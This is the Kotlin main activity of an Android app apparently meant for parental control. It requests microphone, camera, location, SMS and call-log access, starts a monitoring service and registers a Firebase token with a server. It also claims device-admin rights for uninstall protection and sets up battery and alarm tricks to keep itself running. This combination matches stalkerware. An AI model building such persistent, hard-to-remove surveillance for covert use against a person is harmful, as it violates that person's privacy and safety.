package com.parentcontrol.app

import android.Manifest
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMISSION_CODE = 101
    private val ADMIN_REQUEST_CODE = 102
    lateinit var dpm: DevicePolicyManager
    lateinit var adminComponent: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, AdminReceiver::class.java)

        val statusText = findViewById<TextView>(R.id.statusText)
        val btnActivate = findViewById<Button>(R.id.btnActivate)

        FirebaseReceiver.registerTokenToServer()

        btnActivate.setOnClickListener {
            if (checkPermissions()) {
                startMonitoringService()
                FirebaseReceiver.registerTokenToServer()
                activateDeviceAdmin()
                checkNotificationPermission()
                disableBatteryOptimization()
                checkUsageStatsPermission()
                KeepAliveReceiver.scheduleAlarm(this)
                statusText.text = "✅ Monitoring Active"
            } else {
                requestPermissions()
            }
        }
    }

    private fun checkUsageStatsPermission() {
        val appOps = getSystemService(APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(), packageName
        )
        if (mode != AppOpsManager.MODE_ALLOWED) {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        }
    }

    private fun disableBatteryOptimization() {
        val pm = getSystemService(PowerManager::class.java)
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        }
    }

    private fun checkNotificationPermission() {
        val enabledListeners = Settings.Secure.getString(
            contentResolver, "enabled_notification_listeners"
        )
        val componentName = ComponentName(this, NotificationListener::class.java).flattenToString()
        if (enabledListeners == null || !enabledListeners.contains(componentName)) {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    private fun activateDeviceAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Uninstall protection ke liye required hai")
            }
            startActivityForResult(intent, ADMIN_REQUEST_CODE)
        }
    }

    private fun checkPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED &&
               ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG
            ),
            PERMISSION_CODE
        )
    }

    private fun startMonitoringService() {
        startForegroundService(Intent(this, MonitoringService::class.java))
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_CODE && grantResults.isNotEmpty()) {
            startMonitoringService()
            FirebaseReceiver.registerTokenToServer()
            activateDeviceAdmin()
            checkNotificationPermission()
            disableBatteryOptimization()
            checkUsageStatsPermission()
            KeepAliveReceiver.scheduleAlarm(this)
        }
    }
}
